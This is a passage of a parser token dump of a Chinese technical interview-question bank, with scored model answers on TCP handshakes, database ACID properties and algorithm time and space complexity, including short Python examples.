三次握手","text":"TCP 三次握手","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 第一次握手：客户端发送一个 SYN（同步）报文段，其中包含客户端的初始序列号seq=x，表示客户端请求建立连接。\\n","task":false,"loose":false,"text":"**1：** 第一次握手：客户端发送一个 SYN（同步）报文段，其中包含客户端的初始序列号seq=x，表示客户端请求建立连接。","tokens":[{"type":"text","raw":"**1：** 第一次握手：客户端发送一个 SYN（同步）报文段，其中包含客户端的初始序列号seq=x，表示客户端请求建立连接。","text":"**1：** 第一次握手：客户端发送一个 SYN（同步）报文段，其中包含客户端的初始序列号seq=x，表示客户端请求建立连接。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 第一次握手：客户端发送一个 SYN（同步）报文段，其中包含客户端的初始序列号seq=x，表示客户端请求建立连接。","text":" 第一次握手：客户端发送一个 SYN（同步）报文段，其中包含客户端的初始序列号seq=x，表示客户端请求建立连接。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 第二次握手：服务器收到客户端的 SYN 报文段后，发送一个 SYN+ACK 报文段，其中ack=x+1表示对客户端序列号的确认，seq=y是服务器的初始序列号，表示服\\n务器同意建立连接。\\n","task":false,"loose":false,"text":"**1：** 第二次握手：服务器收到客户端的 SYN 报文段后，发送一个 SYN+ACK 报文段，其中ack=x+1表示对客户端序列号的确认，seq=y是服务器的初始序列号，表示服\\n务器同意建立连接。","tokens":[{"type":"text","raw":"**1：** 第二次握手：服务器收到客户端的 SYN 报文段后，发送一个 SYN+ACK 报文段，其中ack=x+1表示对客户端序列号的确认，seq=y是服务器的初始序列号，表示服\\n\\n务器同意建立连接。","text":"**1：** 第二次握手：服务器收到客户端的 SYN 报文段后，发送一个 SYN+ACK 报文段，其中ack=x+1表示对客户端序列号的确认，seq=y是服务器的初始序列号，表示服\\n务器同意建立连接。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 第二次握手：服务器收到客户端的 SYN 报文段后，发送一个 SYN+ACK 报文段，其中ack=x+1表示对客户端序列号的确认，seq=y是服务器的初始序列号，表示服\\n务器同意建立连接。","text":" 第二次握手：服务器收到客户端的 SYN 报文段后，发送一个 SYN+ACK 报文段，其中ack=x+1表示对客户端序列号的确认，seq=y是服务器的初始序列号，表示服\\n务器同意建立连接。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 第三次握手：客户端收到服务器的 SYN+ACK 报文段后，发送一个 ACK 报文段，其中ack=y+1表示对服务器序列号的确认，seq=x+1，表示客户端连接建立成\\n功。此时，双方都确认连接已建立，可以开始数据传输。\\n","task":false,"loose":false,"text":"**1：** 第三次握手：客户端收到服务器的 SYN+ACK 报文段后，发送一个 ACK 报文段，其中ack=y+1表示对服务器序列号的确认，seq=x+1，表示客户端连接建立成\\n功。此时，双方都确认连接已建立，可以开始数据传输。","tokens":[{"type":"text","raw":"**1：** 第三次握手：客户端收到服务器的 SYN+ACK 报文段后，发送一个 ACK 报文段，其中ack=y+1表示对服务器序列号的确认，seq=x+1，表示客户端连接建立成\\n\\n功。此时，双方都确认连接已建立，可以开始数据传输。","text":"**1：** 第三次握手：客户端收到服务器的 SYN+ACK 报文段后，发送一个 ACK 报文段，其中ack=y+1表示对服务器序列号的确认，seq=x+1，表示客户端连接建立成\\n功。此时，双方都确认连接已建立，可以开始数据传输。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 第三次握手：客户端收到服务器的 SYN+ACK 报文段后，发送一个 ACK 报文段，其中ack=y+1表示对服务器序列号的确认，seq=x+1，表示客户端连接建立成\\n功。此时，双方都确认连接已建立，可以开始数据传输。","text":" 第三次握手：客户端收到服务器的 SYN+ACK 报文段后，发送一个 ACK 报文段，其中ack=y+1表示对服务器序列号的确认，seq=x+1，表示客户端连接建立成\\n功。此时，双方都确认连接已建立，可以开始数据传输。","escaped":false}]}]},{"type":"list_item","raw":"- TCP 四次挥手\\n","task":false,"loose":false,"text":"TCP 四次挥手","tokens":[{"type":"text","raw":"TCP 四次挥手","text":"TCP 四次挥手","tokens":[{"type":"text","raw":"TCP 四次挥手","text":"TCP 四次挥手","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 第一次挥手：主动关闭方（假设为客户端）发送一个 FIN（结束）报文段，其中seq=u，表示客户端请求关闭连接。\\n","task":false,"loose":false,"text":"**1：** 第一次挥手：主动关闭方（假设为客户端）发送一个 FIN（结束）报文段，其中seq=u，表示客户端请求关闭连接。","tokens":[{"type":"text","raw":"**1：** 第一次挥手：主动关闭方（假设为客户端）发送一个 FIN（结束）报文段，其中seq=u，表示客户端请求关闭连接。","text":"**1：** 第一次挥手：主动关闭方（假设为客户端）发送一个 FIN（结束）报文段，其中seq=u，表示客户端请求关闭连接。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 第一次挥手：主动关闭方（假设为客户端）发送一个 FIN（结束）报文段，其中seq=u，表示客户端请求关闭连接。","text":" 第一次挥手：主动关闭方（假设为客户端）发送一个 FIN（结束）报文段，其中seq=u，表示客户端请求关闭连接。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 第二次挥手：服务器收到客户端的 FIN 报文段后，发送一个 ACK 报文段，其中ack=u+1，seq=v，表示服务器确认收到客户端的关闭请求，但服务器可能还有数据\\n未发送完，所以先不关闭连接。\\n","task":false,"loose":false,"text":"**1：** 第二次挥手：服务器收到客户端的 FIN 报文段后，发送一个 ACK 报文段，其中ack=u+1，seq=v，表示服务器确认收到客户端的关闭请求，但服务器可能还有数据\\n未发送完，所以先不关闭连接。","tokens":[{"type":"text","raw":"**1：** 第二次挥手：服务器收到客户端的 FIN 报文段后，发送一个 ACK 报文段，其中ack=u+1，seq=v，表示服务器确认收到客户端的关闭请求，但服务器可能还有数据\\n\\n未发送完，所以先不关闭连接。","text":"**1：** 第二次挥手：服务器收到客户端的 FIN 报文段后，发送一个 ACK 报文段，其中ack=u+1，seq=v，表示服务器确认收到客户端的关闭请求，但服务器可能还有数据\\n未发送完，所以先不关闭连接。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 第二次挥手：服务器收到客户端的 FIN 报文段后，发送一个 ACK 报文段，其中ack=u+1，seq=v，表示服务器确认收到客户端的关闭请求，但服务器可能还有数据\\n未发送完，所以先不关闭连接。","text":" 第二次挥手：服务器收到客户端的 FIN 报文段后，发送一个 ACK 报文段，其中ack=u+1，seq=v，表示服务器确认收到客户端的关闭请求，但服务器可能还有数据\\n未发送完，所以先不关闭连接。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 第三次挥手：当服务器数据发送完后，发送一个 FIN 报文段，其中seq=w，ack=u+1，表示服务器请求关闭连接。\\n","task":false,"loose":false,"text":"**1：** 第三次挥手：当服务器数据发送完后，发送一个 FIN 报文段，其中seq=w，ack=u+1，表示服务器请求关闭连接。","tokens":[{"type":"text","raw":"**1：** 第三次挥手：当服务器数据发送完后，发送一个 FIN 报文段，其中seq=w，ack=u+1，表示服务器请求关闭连接。","text":"**1：** 第三次挥手：当服务器数据发送完后，发送一个 FIN 报文段，其中seq=w，ack=u+1，表示服务器请求关闭连接。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 第三次挥手：当服务器数据发送完后，发送一个 FIN 报文段，其中seq=w，ack=u+1，表示服务器请求关闭连接。","text":" 第三次挥手：当服务器数据发送完后，发送一个 FIN 报文段，其中seq=w，ack=u+1，表示服务器请求关闭连接。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 第四次挥手：客户端收到服务器的 FIN 报文段后，发送一个 ACK 报文段，其中ack=w+1，seq=u+1，表示客户端确认收到服务器的关闭请求，此时客户端等待一段\\n时间（2MSL）后关闭连接，服务器收到 ACK 报文段后也关闭连接。","task":false,"loose":false,"text":"**1：** 第四次挥手：客户端收到服务器的 FIN 报文段后，发送一个 ACK 报文段，其中ack=w+1，seq=u+1，表示客户端确认收到服务器的关闭请求，此时客户端等待一段\\n时间（2MSL）后关闭连接，服务器收到 ACK 报文段后也关闭连接。","tokens":[{"type":"text","raw":"**1：** 第四次挥手：客户端收到服务器的 FIN 报文段后，发送一个 ACK 报文段，其中ack=w+1，seq=u+1，表示客户端确认收到服务器的关闭请求，此时客户端等待一段\\n\\n时间（2MSL）后关闭连接，服务器收到 ACK 报文段后也关闭连接。","text":"**1：** 第四次挥手：客户端收到服务器的 FIN 报文段后，发送一个 ACK 报文段，其中ack=w+1，seq=u+1，表示客户端确认收到服务器的关闭请求，此时客户端等待一段\\n时间（2MSL）后关闭连接，服务器收到 ACK 报文段后也关闭连接。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 第四次挥手：客户端收到服务器的 FIN 报文段后，发送一个 ACK 报文段，其中ack=w+1，seq=u+1，表示客户端确认收到服务器的关闭请求，此时客户端等待一段\\n时间（2MSL）后关闭连接，服务器收到 ACK 报文段后也关闭连接。","text":" 第四次挥手：客户端收到服务器的 FIN 报文段后，发送一个 ACK 报文段，其中ack=w+1，seq=u+1，表示客户端确认收到服务器的关闭请求，此时客户端等待一段\\n时间（2MSL）后关闭连接，服务器收到 ACK 报文段后也关闭连接。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 请解释数据库事务的 ACID 特性\\n\\n","depth":2,"text":"请解释数据库事务的 ACID 特性","tokens":[{"type":"text","raw":"请解释数据库事务的 ACID 特性","text":"请解释数据库事务的 ACID 特性","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** 原子性（Atomicity）：事务是一个不可分割的工作单位，事务中的操作要么全部成功，要么全部失败回滚。\\n- **1：** 一致性（Consistency）：事务执行前后，数据库的完整性约束没有被破坏。例如，在一个订单系统中，订单总金额必须等于所有商品金额之和，当对订单进行修改\\n时，事务要确保这个一致性始终成立。\\n- **1：** 隔离性（Isolation）：多个事务并发执行时，一个事务的执行不能被其他事务干扰。不同的隔离级别（如读未提交、读已提交、可重复读、串行化）决定了事务之\\n间的隔离程度。例如，在可重复读隔离级别下，一个事务在两次读取同一数据时，即使期间有其他事务对该数据进行了修改，第一次读取的数据依然不变，避免了不可重复读问题。\\n- **1：** 持久性（Durability）：一旦事务提交，它对数据库的修改就应该永久保存下来。即使系统崩溃或出现其他故障，已提交的事务也不会丢失。例如，用户提交了一个订\\n单，即使在保存订单数据后系统马上崩溃，当系统恢复后，该订单数据依然存在。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 原子性（Atomicity）：事务是一个不可分割的工作单位，事务中的操作要么全部成功，要么全部失败回滚。\\n","task":false,"loose":false,"text":"**1：** 原子性（Atomicity）：事务是一个不可分割的工作单位，事务中的操作要么全部成功，要么全部失败回滚。","tokens":[{"type":"text","raw":"**1：** 原子性（Atomicity）：事务是一个不可分割的工作单位，事务中的操作要么全部成功，要么全部失败回滚。","text":"**1：** 原子性（Atomicity）：事务是一个不可分割的工作单位，事务中的操作要么全部成功，要么全部失败回滚。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 原子性（Atomicity）：事务是一个不可分割的工作单位，事务中的操作要么全部成功，要么全部失败回滚。","text":" 原子性（Atomicity）：事务是一个不可分割的工作单位，事务中的操作要么全部成功，要么全部失败回滚。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 一致性（Consistency）：事务执行前后，数据库的完整性约束没有被破坏。例如，在一个订单系统中，订单总金额必须等于所有商品金额之和，当对订单进行修改\\n时，事务要确保这个一致性始终成立。\\n","task":false,"loose":false,"text":"**1：** 一致性（Consistency）：事务执行前后，数据库的完整性约束没有被破坏。例如，在一个订单系统中，订单总金额必须等于所有商品金额之和，当对订单进行修改\\n时，事务要确保这个一致性始终成立。","tokens":[{"type":"text","raw":"**1：** 一致性（Consistency）：事务执行前后，数据库的完整性约束没有被破坏。例如，在一个订单系统中，订单总金额必须等于所有商品金额之和，当对订单进行修改\\n\\n时，事务要确保这个一致性始终成立。","text":"**1：** 一致性（Consistency）：事务执行前后，数据库的完整性约束没有被破坏。例如，在一个订单系统中，订单总金额必须等于所有商品金额之和，当对订单进行修改\\n时，事务要确保这个一致性始终成立。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 一致性（Consistency）：事务执行前后，数据库的完整性约束没有被破坏。例如，在一个订单系统中，订单总金额必须等于所有商品金额之和，当对订单进行修改\\n时，事务要确保这个一致性始终成立。","text":" 一致性（Consistency）：事务执行前后，数据库的完整性约束没有被破坏。例如，在一个订单系统中，订单总金额必须等于所有商品金额之和，当对订单进行修改\\n时，事务要确保这个一致性始终成立。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 隔离性（Isolation）：多个事务并发执行时，一个事务的执行不能被其他事务干扰。不同的隔离级别（如读未提交、读已提交、可重复读、串行化）决定了事务之\\n间的隔离程度。例如，在可重复读隔离级别下，一个事务在两次读取同一数据时，即使期间有其他事务对该数据进行了修改，第一次读取的数据依然不变，避免了不可重复读问题。\\n","task":false,"loose":false,"text":"**1：** 隔离性（Isolation）：多个事务并发执行时，一个事务的执行不能被其他事务干扰。不同的隔离级别（如读未提交、读已提交、可重复读、串行化）决定了事务之\\n间的隔离程度。例如，在可重复读隔离级别下，一个事务在两次读取同一数据时，即使期间有其他事务对该数据进行了修改，第一次读取的数据依然不变，避免了不可重复读问题。","tokens":[{"type":"text","raw":"**1：** 隔离性（Isolation）：多个事务并发执行时，一个事务的执行不能被其他事务干扰。不同的隔离级别（如读未提交、读已提交、可重复读、串行化）决定了事务之\\n\\n间的隔离程度。例如，在可重复读隔离级别下，一个事务在两次读取同一数据时，即使期间有其他事务对该数据进行了修改，第一次读取的数据依然不变，避免了不可重复读问题。","text":"**1：** 隔离性（Isolation）：多个事务并发执行时，一个事务的执行不能被其他事务干扰。不同的隔离级别（如读未提交、读已提交、可重复读、串行化）决定了事务之\\n间的隔离程度。例如，在可重复读隔离级别下，一个事务在两次读取同一数据时，即使期间有其他事务对该数据进行了修改，第一次读取的数据依然不变，避免了不可重复读问题。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 隔离性（Isolation）：多个事务并发执行时，一个事务的执行不能被其他事务干扰。不同的隔离级别（如读未提交、读已提交、可重复读、串行化）决定了事务之\\n间的隔离程度。例如，在可重复读隔离级别下，一个事务在两次读取同一数据时，即使期间有其他事务对该数据进行了修改，第一次读取的数据依然不变，避免了不可重复读问题。","text":" 隔离性（Isolation）：多个事务并发执行时，一个事务的执行不能被其他事务干扰。不同的隔离级别（如读未提交、读已提交、可重复读、串行化）决定了事务之\\n间的隔离程度。例如，在可重复读隔离级别下，一个事务在两次读取同一数据时，即使期间有其他事务对该数据进行了修改，第一次读取的数据依然不变，避免了不可重复读问题。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 持久性（Durability）：一旦事务提交，它对数据库的修改就应该永久保存下来。即使系统崩溃或出现其他故障，已提交的事务也不会丢失。例如，用户提交了一个订\\n单，即使在保存订单数据后系统马上崩溃，当系统恢复后，该订单数据依然存在。","task":false,"loose":false,"text":"**1：** 持久性（Durability）：一旦事务提交，它对数据库的修改就应该永久保存下来。即使系统崩溃或出现其他故障，已提交的事务也不会丢失。例如，用户提交了一个订\\n单，即使在保存订单数据后系统马上崩溃，当系统恢复后，该订单数据依然存在。","tokens":[{"type":"text","raw":"**1：** 持久性（Durability）：一旦事务提交，它对数据库的修改就应该永久保存下来。即使系统崩溃或出现其他故障，已提交的事务也不会丢失。例如，用户提交了一个订\\n\\n单，即使在保存订单数据后系统马上崩溃，当系统恢复后，该订单数据依然存在。","text":"**1：** 持久性（Durability）：一旦事务提交，它对数据库的修改就应该永久保存下来。即使系统崩溃或出现其他故障，已提交的事务也不会丢失。例如，用户提交了一个订\\n单，即使在保存订单数据后系统马上崩溃，当系统恢复后，该订单数据依然存在。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 持久性（Durability）：一旦事务提交，它对数据库的修改就应该永久保存下来。即使系统崩溃或出现其他故障，已提交的事务也不会丢失。例如，用户提交了一个订\\n单，即使在保存订单数据后系统马上崩溃，当系统恢复后，该订单数据依然存在。","text":" 持久性（Durability）：一旦事务提交，它对数据库的修改就应该永久保存下来。即使系统崩溃或出现其他故障，已提交的事务也不会丢失。例如，用户提交了一个订\\n单，即使在保存订单数据后系统马上崩溃，当系统恢复后，该订单数据依然存在。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 什么是代码的时间复杂度和空间复杂度\\n\\n","depth":2,"text":"什么是代码的时间复杂度和空间复杂度","tokens":[{"type":"text","raw":"什么是代码的时间复杂度和空间复杂度","text":"什么是代码的时间复杂度和空间复杂度","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（9 分）\\n\\n","depth":4,"text":"解答（9 分）","tokens":[{"type":"text","raw":"解答（9 分）","text":"解答（9 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** 时间复杂度和空间复杂度是衡量算法效率的两个重要指标\\n- **1：** 时间复杂度：用于描述算法执行所需的时间随输入规模增长的变化趋势。它主要关注算法中执行的基本操作次数。\\n- **1：** 常数时间复杂度：无论输入规模如何变化，算法执行的时间都是固定的。例如，从数组中获取指定下标的元素，无论数组大小是多少，获取操作的时间基本相同。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 时间复杂度和空间复杂度是衡量算法效率的两个重要指标\\n","task":false,"loose":false,"text":"**1：** 时间复杂度和空间复杂度是衡量算法效率的两个重要指标","tokens":[{"type":"text","raw":"**1：** 时间复杂度和空间复杂度是衡量算法效率的两个重要指标","text":"**1：** 时间复杂度和空间复杂度是衡量算法效率的两个重要指标","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 时间复杂度和空间复杂度是衡量算法效率的两个重要指标","text":" 时间复杂度和空间复杂度是衡量算法效率的两个重要指标","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 时间复杂度：用于描述算法执行所需的时间随输入规模增长的变化趋势。它主要关注算法中执行的基本操作次数。\\n","task":false,"loose":false,"text":"**1：** 时间复杂度：用于描述算法执行所需的时间随输入规模增长的变化趋势。它主要关注算法中执行的基本操作次数。","tokens":[{"type":"text","raw":"**1：** 时间复杂度：用于描述算法执行所需的时间随输入规模增长的变化趋势。它主要关注算法中执行的基本操作次数。","text":"**1：** 时间复杂度：用于描述算法执行所需的时间随输入规模增长的变化趋势。它主要关注算法中执行的基本操作次数。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 时间复杂度：用于描述算法执行所需的时间随输入规模增长的变化趋势。它主要关注算法中执行的基本操作次数。","text":" 时间复杂度：用于描述算法执行所需的时间随输入规模增长的变化趋势。它主要关注算法中执行的基本操作次数。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 常数时间复杂度：无论输入规模如何变化，算法执行的时间都是固定的。例如，从数组中获取指定下标的元素，无论数组大小是多少，获取操作的时间基本相同。","task":false,"loose":false,"text":"**1：** 常数时间复杂度：无论输入规模如何变化，算法执行的时间都是固定的。例如，从数组中获取指定下标的元素，无论数组大小是多少，获取操作的时间基本相同。","tokens":[{"type":"text","raw":"**1：** 常数时间复杂度：无论输入规模如何变化，算法执行的时间都是固定的。例如，从数组中获取指定下标的元素，无论数组大小是多少，获取操作的时间基本相同。","text":"**1：** 常数时间复杂度：无论输入规模如何变化，算法执行的时间都是固定的。例如，从数组中获取指定下标的元素，无论数组大小是多少，获取操作的时间基本相同。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 常数时间复杂度：无论输入规模如何变化，算法执行的时间都是固定的。例如，从数组中获取指定下标的元素，无论数组大小是多少，获取操作的时间基本相同。","text":" 常数时间复杂度：无论输入规模如何变化，算法执行的时间都是固定的。例如，从数组中获取指定下标的元素，无论数组大小是多少，获取操作的时间基本相同。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```python\\ndef get_element(arr, index):\\n    return arr[index]\\n```","lang":"python","text":"def get_element(arr, index):\\n    return arr[index]"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 线性时间复杂度：算法执行时间与输入规模成正比。例如，遍历一个数组，对每个元素进行一次操作，操作次数随数组长度 n 线性增长。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 线性时间复杂度：算法执行时间与输入规模成正比。例如，遍历一个数组，对每个元素进行一次操作，操作次数随数组长度 n 线性增长。","task":false,"loose":false,"text":"**1：** 线性时间复杂度：算法执行时间与输入规模成正比。例如，遍历一个数组，对每个元素进行一次操作，操作次数随数组长度 n 线性增长。","tokens":[{"type":"text","raw":"**1：** 线性时间复杂度：算法执行时间与输入规模成正比。例如，遍历一个数组，对每个元素进行一次操作，操作次数随数组长度 n 线性增长。","text":"**1：** 线性时间复杂度：算法执行时间与输入规模成正比。例如，遍历一个数组，对每个元素进行一次操作，操作次数随数组长度 n 线性增长。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 线性时间复杂度：算法执行时间与输入规模成正比。例如，遍历一个数组，对每个元素进行一次操作，操作次数随数组长度 n 线性增长。","text":" 线性时间复杂度：算法执行时间与输入规模成正比。例如，遍历一个数组，对每个元素进行一次操作，操作次数随数组长度 n 线性增长。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```python\\ndef sum_array(arr):\\n    total = 0\\n    for num in arr:\\n        total += num\\n    return total\\n```","lang":"python","text":"def sum_array(arr):\\n    total = 0\\n    for num in arr:\\n        total += num\\n    return total"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 平方时间复杂度：常见于嵌套循环，算法执行时间与输入规模的平方成正比。例如，冒泡排序算法，其时间复杂度为 O (n²)，因为它包含两层嵌套循环，对于长度为 n 的\\n数组，总的比较次数为 n*(n - 1)/2。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 平方时间复杂度：常见于嵌套循环，算法执行时间与输入规模的平方成正比。例如，冒泡排序算法，其时间复杂度为 O (n²)，因为它包含两层嵌套循环，对于长度为 n 的\\n数组，总的比较次数为 n*(n - 1)/2。","task":false,"loose":false,"text":"**1：** 平方时间复杂度：常见于嵌套循环，算法执行时间与输入规模的平方成正比。例如，冒泡排序算法，其时间复杂度为 O (n²)，因为它包含两层嵌套循环，对于长度为 n 的\\n数组，总的比较次数为 n*(n - 1)/2。","tokens":[{"type":"text","raw":"**1：** 平方时间复杂度：常见于嵌套循环，算法执行时间与输入规模的平方成正比。例如，冒泡排序算法，其时间复杂度为 O (n²)，因为它包含两层嵌套循环，对于长度为 n 的\\n\\n数组，总的比较次数为 n*(n - 1)/2。","text":"**1：** 平方时间复杂度：常见于嵌套循环，算法执行时间与输入规模的平方成正比。例如，冒泡排序算法，其时间复杂度为 O (n²)，因为它包含两层嵌套循环，对于长度为 n 的\\n数组，总的比较次数为 n*(n - 1)/2。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 平方时间复杂度：常见于嵌套循环，算法执行时间与输入规模的平方成正比。例如，冒泡排序算法，其时间复杂度为 O (n²)，因为它包含两层嵌套循环，对于长度为 n 的\\n数组，总的比较次数为 n*(n - 1)/2。","text":" 平方时间复杂度：常见于嵌套循环，算法执行时间与输入规模的平方成正比。例如，冒泡排序算法，其时间复杂度为 O (n²)，因为它包含两层嵌套循环，对于长度为 n 的\\n数组，总的比较次数为 n*(n - 1)/2。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```python\\ndef bubble_sort(arr):\\n    n = len(arr)\\n    for i in range(n):\\n        for j in range(0, n - i - 1):\\n            if arr[j] > arr[j + 1]:\\n                arr[j], arr[j + 1] = arr[j + 1], arr[j]\\n    return arr\\n```","lang":"python","text":"def bubble_sort(arr):\\n    n = len(arr)\\n    for i in range(n):\\n        for j in range(0, n - i - 1):\\n            if arr[j] > arr[j + 1]:\\n                arr[j], arr[j + 1] = arr[j + 1], arr[j]\\n    return arr"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 空间复杂度：用于描述算法执行过程中所需的额外空间随输入规模增长的变化趋势。它主要关注算法在运行过程中创建的临时变量、数据结构等所占用的空间。\\n- **1：** 常数空间复杂度：算法执行过程中所需的额外空间是固定的，不随输入规模变化。例如，计算两个整数之和的函数，除了输入参数和返回值，没有使用额外的与输入规模相关的空间。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 空间复杂度：用于描述算法执行过程中所需的额外空间随输入规模增长的变化趋势。它主要关注算法在运行过程中创建的临时变量、数据结构等所占用的空间。\\n","task":false,"loose":false,"text":"**1：** 空间复杂度：用于描述算法执行过程中所需的额外空间随输入规模增长的变化趋势。它主要关注算法在运行过程中创建的临时变量、数据结构等所占用的空间。","tokens":[{"type":"text","raw":"**1：** 空间复杂度：用于描述算法执行过程中所需的额外空间随输入规模增长的变化趋势。它主要关注算法在运行过程中创建的临时变量、数据结构等所占用的空间。","text":"**1：** 空间复杂度：用于描述算法执行过程中所需的额外空间随输入规模增长的变化趋势。它主要关注算法在运行过程中创建的临时变量、数据结构等所占用的空间。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 空间复杂度：用于描述算法执行过程中所需的额外空间随输入规模增长的变化趋势。它主要关注算法在运行过程中创建的临时变量、数据结构等所占用的空间。","text":" 空间复杂度：用于描述算法执行过程中所需的额外空间随输入规模增长的变化趋势。它主要关注算法在运行过程中创建的临时变量、数据结构等所占用的空间。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 常数空间复杂度：算法执行过程中所需的额外空间是固定的，不随输入规模变化。例如，计算两个整数之和的函数，除了输入参数和返回值，没有使用额外的与输入规模相关的空间。","task":false,"loose":false,"text":"**1：** 常数空间复杂度：算法执行过程中所需的额外空间是固定的，不随输入规模变化。例如，计算两个整数之和的函数，除了输入参数和返回值，没有使用额外的与输入规模相关的空间。","tokens":[{"type":"text","raw":"**1：** 常数空间复杂度：算法执行过程中所需的额外空间是固定的，不随输入规模变化。例如，计算两个整数之和的函数，除了输入参数和返回值，没有使用额外的与输入规模相关的空间。","text":"**1：** 